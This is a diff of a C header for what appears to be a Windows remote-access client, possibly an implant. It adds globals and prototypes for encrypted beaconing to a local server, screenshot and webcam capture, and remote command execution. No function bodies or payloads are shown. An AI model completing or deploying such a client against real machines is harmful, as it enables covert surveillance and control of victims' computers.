@@ -23,7 +23,8 @@
 // #pragma comment(lib, "libcrypto.lib")
 // #pragma comment(lib, "ole32.lib")
 // #pragma comment(lib, "oleaut32.lib")
-// #pragma comment(lib, "gdiplus.lib")
+// #pragma comment(lib, "gdi32.lib")
+// #pragma comment(lib, "windowscodecs.lib")
 
 #define KEY_LENGTH 32
 #define IV_LENGTH 12
@@ -31,19 +32,19 @@
 #define TAG_LENGTH 16
 #define SESSION_ID_LENGTH 32
 #define SHA256_DIGEST_LENGTH 32
-#define IP_ADDRESS_LENGTH 16
 #define CHUNK_SIZE 1024
 
 // Globals
 SOCKET client_socket = INVALID_SOCKET;
 time_t start_time;
 FILE* log_file = NULL;
-int exit_process = 0;
-char SESSION_ID[SESSION_ID_LENGTH + 1];
+int exit_process = FALSE;
+char SESSION_ID[SESSION_ID_LENGTH + 1] = {0};
+char IP_ADDRESS[INET6_ADDRSTRLEN] = {0};
 const boolean LOGGING = TRUE;
 const char* CVER = "0.2.0";
 const char* TYPE = "c";
-const char* SERVER_ADDRESS = "localhost";
+const char* SERVER_ADDRESS = "127.0.0.1";
 const int SERVER_PORT = 54678;
 const int MAX_RETRIES = 5;
 const int RETRY_INTERVALS[] = {
@@ -65,16 +66,14 @@ int base64_invs[] = { 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
 	29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
 	43, 44, 45, 46, 47, 48, 49, 50, 51 };
 
-
 // Function prototypes
 void log_it(const char* format, ...);
-void get_session_id();
+void get_session_id(char* ip_address);
 size_t b64_encoded_size(size_t inlen);
 size_t b64_decoded_size(const char *in);
 int b64_isvalidchar(char c);
 char* base64_encode(const unsigned char *data, size_t length);
 int base64_decode(const char *in, unsigned char *out, size_t outlen);
-void derive_key(const unsigned char *shared_key, unsigned char *salt, unsigned char *key);
 char* encrypt_data(const char *data, const char *shared_key);
 char* decrypt_data(const char *encrypted, const char *shared_key);
 void send_command(const char* response);
@@ -83,15 +82,16 @@ void sleep_ms(int milliseconds);
 int get_retry_interval(int retries);
 WCHAR* utf8_to_utf16(const char* str);
 DWORD WINAPI beacon_interval_thread(LPVOID lpParam);
-void start_beacon_interval();
-void run_screenshot();
-void run_webcam_clip();
+HANDLE start_beacon_interval(void);
+void run_screenshot(void);
+void run_webcam_clip(void);
 void parse_action(const char* action);
 char* format_file_name(const char* name, const char* extension);
 char* format_time(long milliseconds);
-void get_uptime();
+void get_uptime(void);
 char* run_command(const char* command);
-void handle_connection();
-int connect_to_server();
+void handle_connection(void);
+char* get_peer_info(SOCKET sock);
+int connect_to_server(void);
 
 #endif // CLIENT_H
